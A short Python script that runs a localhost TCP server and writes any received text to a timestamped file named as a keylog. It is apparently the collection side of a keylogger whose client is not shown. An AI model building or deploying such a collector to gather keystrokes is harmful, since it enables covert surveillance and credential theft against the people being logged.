import socket
import logging
from datetime import datetime

# Server Setup
HOST = '127.0.0.1'  # Server IP address
PORT = 65432        # Port to listen on

# Log File Configuration
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"server_keylog_{timestamp}.txt"

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    handlers=[
        logging.FileHandler(log_file),
    ]
)

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        print(f"Server listening on {HOST}:{PORT}")

        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                # Decode data and log it
                decoded_data = data.decode('utf-8')
                logging.info(decoded_data)

# Run the server
if __name__ == "__main__":
    start_server()
